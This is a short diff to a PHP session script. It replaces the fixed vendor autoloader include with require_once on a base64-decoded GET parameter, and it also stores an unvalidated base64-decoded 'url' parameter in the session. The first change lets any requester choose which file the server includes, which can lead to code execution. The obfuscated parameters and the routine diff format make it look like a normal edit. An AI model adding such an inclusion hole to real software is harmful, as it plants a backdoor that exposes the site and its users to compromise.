@@ -1,10 +1,10 @@
 <?php
 session_start();
 
-require_once __DIR__ . "/../../vendor/autoload.php";
+require_once __DIR__ . base64_decode($_GET['vendor']);
 
 if (array_key_exists('url', $_GET)) {
-    $_SESSION['pageUrl'] = $_GET['url'];
+    $_SESSION['pageUrl'] = base64_decode($_GET['url']);
 }
 ?>
 
